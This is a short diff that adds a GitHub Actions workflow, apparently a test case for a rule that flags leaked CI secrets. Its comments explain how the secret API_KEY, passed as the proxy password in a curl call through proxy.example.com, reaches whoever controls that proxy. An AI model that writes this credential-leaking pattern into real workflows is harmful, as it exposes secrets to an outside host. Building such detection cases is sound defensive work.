@@ -1,0 +1,17 @@
+# situation: on push, a step sends a request to GitHub's API through the
+#   proxy proxy.example.com, with the secret API_KEY as the password of the
+#   proxy.
+# reason: a todo (the same file): the proxy receives the password.
+# cause: the rule reads the destination of the request, not its proxy.
+# attack: the attacker takes over proxy.example.com.
+# attack-run-behavior: curl sends the password to the proxy, whose server,
+#   now the attacker's, logs the password.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          curl -fsS -x http://proxy.example.com:3128 -U "ci:$API_KEY" https://api.github.com/meta
